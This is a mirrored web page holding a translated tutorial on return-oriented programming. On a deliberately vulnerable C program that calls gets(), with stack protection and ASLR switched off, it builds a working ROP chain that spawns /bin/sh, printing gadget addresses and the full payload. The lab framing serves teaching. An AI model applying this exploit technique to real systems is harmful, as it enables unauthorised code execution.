@@ -1,0 +1,135 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134931760-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Return oriented programming. We collect exploit in pieces</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="Introduction 
+ In this article we will try to figure out how the Return Oriented exploit works. The topic is, in principle, so hackneyed, and there ar...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({
+            google_ad_client: "ca-pub-6974184241884155",
+            enable_page_level_ads: true
+       });
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
+    <div class="page-header-text">Geekly Articles each Day</div>
+  </header>
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="../../search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
+  <section class="page js-page"><h1>Return oriented programming. We collect exploit in pieces</h1><div class="post__text post__text-html js-mediator-article">  <b>Introduction</b> <br>  In this article we will try to figure out how the Return Oriented exploit works.  The topic is, in principle, so hackneyed, and there are a lot of publications in the internet, but I will try to write in such a way that this article is not a simple compilation.  Along the way, we will have to deal with some system features of Linux and the x86-64 architecture (all the experiments described below were performed on Ubuntu 14.04).  The main goal will be to exploit the trivial vulnerability gets using ROP (Return oriented programming). <br><a name="habracut"></a><br>  <b>Vulnerability</b> <br>  In fact, it is clear that the search for vulnerabilities is a separate problem.  It would be nice to start by inventing some simple vulnerability.  For example, the gets () function, which is included in the standard C library, is one big vulnerability, and we will use it. <br><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; int func() { int val = 0; char buf[10]; gets(buf); printf("%s\n", buf); val = strlen(buf); return val; } int main(int argc, char **argv) { return func(); }</span></span></span></span></code> </pre> <br>  This code reads from stdin everything that it sees until it stumbles upon the end of line or file character.  Generally speaking, the use of this feature is not very welcome and it exists only for backward compatibility.  However, I myself have often seen the latest code in which people used this function.  Well, God be with him.  Let's try to compile (we will talk about the value of -fno-stack-protector later). <br><pre> <code class="bash hljs">gcc -o main main.c -g -Wall -fno-stack-protector</code> </pre><br>  gcc warned us two more times about the absurdity of our actions (the message may not be available in other gcc assemblies) <br><pre> <code class="bash hljs">main.c: In <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> <span class="hljs-string"><span class="hljs-string">'func'</span></span>: main.c:7:2: warning: <span class="hljs-string"><span class="hljs-string">'gets'</span></span> is deprecated (declared at /usr/include/stdio.h:638) [-Wdeprecated-declarations] gets(buf); ^ /tmp/ccBFHgPN.o: In <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> `func<span class="hljs-string"><span class="hljs-string">': /home/alexhoppus/Desktop/rop_tutorial/main.c:7: warning: the `gets'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> is dangerous and should not be used.</code> </pre><br>  Well, let's understand what he is babbling about dangerous and deprecated. <br>  <b>Smash the stack</b> <br>  From the code above it is clear that there is a buffer in which the string is read.  The buffer is on the stack.  As you know, a stack is no more than a piece of rw memory in the address space of an application.  Let's try restoring its layout to x86-64.  We will do this with the objdump utility, and then check with gdb. <br><pre> <code class="bash hljs">objdump -d main 00000000004005bd &lt;func&gt;: 4005bd: 55 push %rbp 4005be: 48 89 e5 mov %rsp,%rbp 4005c1: 48 83 ec 10 sub <span class="hljs-variable"><span class="hljs-variable">$0x10</span></span>,%rsp 4005c5: c7 45 <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> 00 00 00 00 movl <span class="hljs-variable"><span class="hljs-variable">$0x0</span></span>,-0x4(%rbp) 4005cc: 48 8d 45 f0 lea -0x10(%rbp),%rax 4005d0: 48 89 c7 mov %rax,%rdi 4005d3: e8 e8 fe ff ff callq 4004c0 &lt;gets@plt&gt; 4005d8: 48 8d 45 f0 lea -0x10(%rbp),%rax 4005dc: 48 89 c7 mov %rax,%rdi 4005df: e8 9c fe ff ff callq 400480 &lt;puts@plt&gt; 4005e4: 48 8d 45 f0 lea -0x10(%rbp),%rax 4005e8: 48 89 c7 mov %rax,%rdi 4005eb: e8 a0 fe ff ff callq 400490 &lt;strlen@plt&gt; 4005f0: 89 45 <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> mov %eax,-0x4(%rbp) 4005f3: 8b 45 <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> mov -0x4(%rbp),%eax 4005f6: c9 leaveq 4005f7: c3 retq 00000000004005f8 &lt;main&gt;: 4005f8: 55 push %rbp 4005f9: 48 89 e5 mov %rsp,%rbp 4005fc: 48 83 ec 10 sub <span class="hljs-variable"><span class="hljs-variable">$0x10</span></span>,%rsp 400600: 89 7d <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> mov %edi,-0x4(%rbp) 400603: 48 89 75 f0 mov %rsi,-0x10(%rbp) 400607: b8 00 00 00 00 mov <span class="hljs-variable"><span class="hljs-variable">$0x0</span></span>,%eax 40060c: e8 ac ff ff ff callq 4005bd &lt;func&gt; 400611: c9 leaveq 400612: c3 retq 400613: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 40061a: 00 00 00 40061d: 0f 1f 00 nopl (%rax)</code> </pre><br>  Let's start with the line in main, which makes the call to func (40060c).  callq can be represented as push return address (400611) and jump to func.  Thus, the return address is put on the stack first.  When we jumped on func, we pushed onto the% rbp stack — the start address of the previous frame stack.  Next, we expand the stack (the stack grows down) by 16 bytes and zeroes the first 4 bytes after the saved% rbp - apparently, this is our variable val on the stack.  The gets function is passed a pointer to the buffer through the% rdi register, which is calculated as follows lea -0x10 (% rbp),% rax.  We summarize the picture: <br><img src="https://habrastorage.org/files/63e/ba8/dc7/63eba8dc7c3a41f9a44aedea9b1d3d23.jpeg"><br>  From the picture we can conclude that if we write a string with more than 15 characters (+1 byte line end) into the buffer, our application will most likely fall down, since we will overwrite% rbp - the start address of the previous frame stack.  At the same time, we’ll go to main normally from the current function func, but then we will have problems - the program will think that its stack is not at all where it actually is, and since the% rip is the return address, we return get SIGSEGV from the Linux kernel when we return to the wrong address. <br>  Now look at the stack in terms of gdb: <br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print 'a'*15"</span></span> &gt; input2 gdb ./main (gdb) b func Breakpoint 1 at 0x4005c5: file main.c, line 5. (gdb) r &lt; input2 (gdb) info register ... rsp 0x7fffffffde90 0x7fffffffde90 ... (gdb) x/100x 0x7fffffffde90 0x7fffffffde90: 0x61616161 0x61616161 0x61616161 0x00616161 0x7fffffffdea0: 0xffffdec0 0x00007fff 0x00400611 0x00000000 0x7fffffffdeb0: 0xffffdfa8 0x00007fff 0x00000000 0x00000001</code> </pre><br>  Now we can finally be sure that we were not mistaken.  Try typing more than 15 characters on stdin and make sure that the application receives SIGSEGV.  Now it's time to return to the -fno-stack-protector option.  Repeat this trick without it (note: I have this option turned on by default - this is a gcc build, you may have the opposite). <br><pre> <code class="bash hljs">gcc -o main main.c -g -Wall python -c <span class="hljs-string"><span class="hljs-string">"print 'a'*26"</span></span> | ./main aaaaaaaaaaaaaaaaaaaaaaaaaa *** stack smashing detected ***: ./main terminated Aborted (core dumped)</code> </pre><br>  The -fstack-protector flag enables gcc to support buffer overflow protection.  The principle of its operation is simple - a value known to the compiler is placed on the stack between% rip,% rbp and the writeable buffer, after exiting the function, the value is read from the stack and compared with the original one.  If the face does not match, then we will see a message about stack smashing.  You can see for yourself how stack canaries work by simply disassembling objdump -d <br><pre> <code class="bash hljs">000000000040062d &lt;func&gt;: ... 400635: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 40063c: 00 00 40063e: 48 89 45 f8 mov %rax,-0x8(%rbp) ... 400675: 48 8b 55 f8 mov -0x8(%rbp),%rdx 400679: 64 48 33 14 25 28 00 xor %fs:0x28,%rdx 400680: 00 00 400682: 74 05 je 400689 &lt;func+0x5c&gt; 400684: e8 77 fe ff ff callq 400500 &lt;__stack_chk_fail@plt&gt; 400689: c9 leaveq 40068a: c3 retq</code> </pre><br>  To simplify your life when writing a ROP exloit, we will compile the application with the -fno-stack-protector flag.  This will be the first of two defense mechanisms, which we will deliberately turn off in order to simplify our lives. <br>  <b>Address space layout randomization</b> <br>  Talking about the ASLR, it’s probably worth getting to the point.  As you understand, an attacker can overflow the buffer on the stack and overwrite the return address in order to jump to any code.  The question remains - where to jump and where does the necessary hacker code come from?  It is impossible to throw the code onto the stack, because the stack is not executable.  This is provided at the level of the page tables that form the virtual address space of the process, in other words, there is no “X” flag in the page table entry entry.  You can jump on zamaplennye libraries, or rather on some pieces of code from these libraries.  Return oriented programming is based on this principle.  So that it was impossible to guess in advance the address where the library is mapped, and, consequently, the address of a specific piece of code from the library, when the application starts, the position of the library in the address space of the process is randomized.  This is a feature of the Linux kernel, which is controlled by the proc. <br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> 0 &gt; /proc/sys/kernel/randomize_va_space</code> </pre>  To simplify, it will also have to be disabled. <br><br>  <b>Exec / bin / sh</b> <br>  Well, the application with the vulnerability is collected without protection against stack overflow, the ASLR is disabled.  Now, to demonstrate the vulnerability, let's force the process - the victim to invoke / bin / sh instead of himself.  First you need to submit how the exploit code will look like: <br><pre> <code class="bash hljs">section .text global _start _start: mov rax, 0x3b mov rdi, cmd mov rsi, 0 mov rdx, 0 syscall section .data cmd: db <span class="hljs-string"><span class="hljs-string">'/bin/sh'</span></span> .end:</code> </pre><br>  Everything is simple here - on x86-64, the application code makes a system call using the syscall instruction.  In this case, it is necessary to place the system call number (0x3b) in% rax, the arguments are placed in the registers% rdi,% rsi,% rdx ....  If you forgot what the list of execve arguments looks like, see <a href="http://man7.org/linux/man-pages/man2/execve.2.html">here.</a> <br>  Check that the shell is invoked: <br><pre> <code class="bash hljs">nasm -f elf64 exec1.S -o exec.o ld -o <span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> exec.o ./<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span></code> </pre><br><br>  <b>Gadgets</b> <br>  Generally speaking, a gadget is just a piece of library or application code.  Search for gadgets for our future exploit, we will be in libc.  To begin with, let's look at what address the code section of the libc is mapped to.  To do this, you can stop the application on the main function with gdb and execute: <br><pre> <code class="bash hljs">cat /proc/`pidof main`/maps | grep libc | grep r-xp</code> </pre><br>  Here the “X” flag in the mapping is important to us, from which we can understand that this is a directly executable section. <br><pre> <code class="bash hljs">7ffff7a14000-7ffff7bcf000 r-xp 00000000 08:01 466797 /lib/x86_64-linux-gnu/libc-2.19.so</code> </pre><br>  Ideologically, the behavior of the future exploit is shown in the following figure: <br><img src="//habrastorage.org/files/e56/d25/76f/e56d2576f50f455b9482791a0725ec83.jpeg"><br>  We start by putting on the stack instead of the return address addr1, which will point to the first gadget from the libc code.  The first gadget will perform pop% rax, placing in the% rax register the value 0x3b we prepared on the stack, then ret will take the address addr2 from the stack and jump to it.  As for 0x601000, this is the address of the beginning of the rw region (data section) of the executable file ./main: <br><pre> <code class="bash hljs">00400000-00401000 r-xp 00000000 08:01 527064 /home/alexhoppus/Desktop/rop_tutorial/main 00600000-00601000 r--p 00000000 08:01 527064 /home/alexhoppus/Desktop/rop_tutorial/main 00601000-00602000 rw-p 00001000 08:01 527064 /home/alexhoppus/Desktop/rop_tutorial/main</code> </pre><br>  We will select this address to put the string "/ bin // sh" on it.  In the register% rdx we save the string itself, and in% rdi its address. <pre> <code class="bash hljs">mov qword [rdi], rdx</code> </pre>  puts "/ bin // sh" at 0x601000.  The main work is done - the rest of the code resets the value of the% rsi and% rdx registers (2 and 3 execve arguments) and executes syscall.  Thus, we in 7 return exovnul unsuspecting main and turned it into / bin / sh. 
+      <br>
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <ins class="adsbygoogle"
+          style="display:block; text-align:center;"
+          data-ad-layout="in-article"
+          data-ad-format="fluid"
+          data-ad-client="ca-pub-6974184241884155"
+          data-ad-slot="8945601208"></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      <br>
+      <b>How to find gadgets</b> <br>  In fact, there are many utilities that analyze the library / application code and provide you with a set of ready-made gadgets with addresses.  This article is used to search for gadgets.  Example output gadget search engine: <br><pre> <code class="bash hljs">./rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.19.so -r 2 | grep <span class="hljs-string"><span class="hljs-string">"pop rax"</span></span> ... 0x0019d345: pop rax ; out dx, al ; jmp qword [rdx] ; (1 found) 0x000fafb9: pop rax ; pop rdi ; call rax ; (1 found) 0x000193b8: pop rax ; ret ; (1 found) 0x001a09c8: pop rax ; adc al, 0xF1 ; jmp qword [rax] ; (1 found) ...</code> </pre><br>  To get real addresses of gadgets in memory, you need to add to the addresses obtained in the output an offset equal to the address of the start of mapping of the executable section of the libc (see above) - 0x7ffff7a14000. <br><br>  <b>And what is the result?</b> <br>  After you find all the necessary gadgets, you’ll have something like <br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print 'a'*24+'\xb8\xd3\xa2\xf7\xff\x7f\x00\x00'+'\x3b\x00\x00\x00\x00\x00\x00\x00'+'\x21\x6a\xa3\xf7\xff\x7f\x00\x00'+'\x00\x10\x60\x00\x00\x00\x00\x00'+'\x8e\x5b\xa1\xf7\xff\x7f\x00\x00'+'\x2f\x62\x69\x6e\x2f\x73\x68\x00'+'\x27\x3c\xa3\xf7\xff\x7f\x00\x00'+'\x14\xa1\xb4\xf7\xff\x7f\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\x8e\x5b\xa1\xf7\xff\x7f\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\xd5\x68\xad\xf7\xff\x7f\x00\x00'"</span></span> | ./main</code> </pre><br>  Check with strace that the shell is actually running.  If everything is done correctly, / bin / sh will start and exit immediately, since stdin is already empty.  For obvious reasons, in real conditions, no one will connect the stdin of this shell with the keyboard, but we can allow a small hack to test the performance of the exploit: <br><pre> <code class="bash hljs">alexhoppus@hp:~/Desktop/rop_tutorial$ cat &lt;(python -c <span class="hljs-string"><span class="hljs-string">"print 'a'*24+'\xb8\xd3\xa2\xf7\xff\x7f\x00\x00'+'\x3b\x00\x00\x00\x00\x00\x00\x00'+'\x21\x6a\xa3\xf7\xff\x7f\x00\x00'+'\x00\x10\x60\x00\x00\x00\x00\x00'+'\x8e\x5b\xa1\xf7\xff\x7f\x00\x00'+'\x2f\x62\x69\x6e\x2f\x73\x68\x00'+'\x27\x3c\xa3\xf7\xff\x7f\x00\x00'+'\x14\xa1\xb4\xf7\xff\x7f\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\x8e\x5b\xa1\xf7\xff\x7f\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\xd5\x68\xad\xf7\xff\x7f\x00\x00'"</span></span>) - | ./main aaaaaaaaaaaaaaaaaaaaaaaa Ӣ   ls Blank Flowchart - New Page (2).jpeg article~ exec1.S input main.c shell a.out <span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> hello input2 rop.jpeg stack.jpeg article</code> </pre><br>  Well that's all.  I hope that the article will give ground for your future experiments (not in the practical plane, but scientific and informative). </div><p>Source: <a href="https://habr.com/ru/post/255519/">https://habr.com/ru/post/255519/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../255505/index.html">Weekly assembly Vivaldi 1.0.151.7</a></li>
+<li><a href="../255507/index.html">Project Maelstrom went public beta</a></li>
+<li><a href="../255509/index.html">The French TV channel was hacked after an interview with an employee on the background of stickers with passwords.</a></li>
+<li><a href="../255511/index.html">Pure CSS3 Calculator</a></li>
+<li><a href="../255513/index.html">We are switching from STM32 to the Russian K1986BE92QI microcontroller. Practical application: Generate and reproduce sound. Part one: we generate a square and sinusoidal signal. Mastering the DAC (DAC)</a></li>
+<li><a href="../255523/index.html">SQL Language Tutorial (DDL, DML) on the example of MS SQL Server dialect. Part two</a></li>
+<li><a href="../255525/index.html">Encryption and decryption - accessing the OpenSSL API using JNI calls</a></li>
+<li><a href="../255527/index.html">Ordinary Primes: The Secrets of the Weavers' Secret Society</a></li>
+<li><a href="../255529/index.html">Use Java smart cards to protect software. Chapter 1. General Information</a></li>
+<li><a href="../255531/index.html">Use Java smart cards to protect software. Chapter 2. Java smart card from the applet developer's point of view</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52496797 = new Ya.Metrika({
+                  id:52496797,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+  <footer class="page-footer">
+    <div class="page-footer-legal-info-container page-footer-element">
+      <p>
+        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+      </p>
+    </div>
+    <div class="page-footer-counters-container page-footer-element">
+      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
+    </div>
+  </footer>
+</body>
+
+</html>
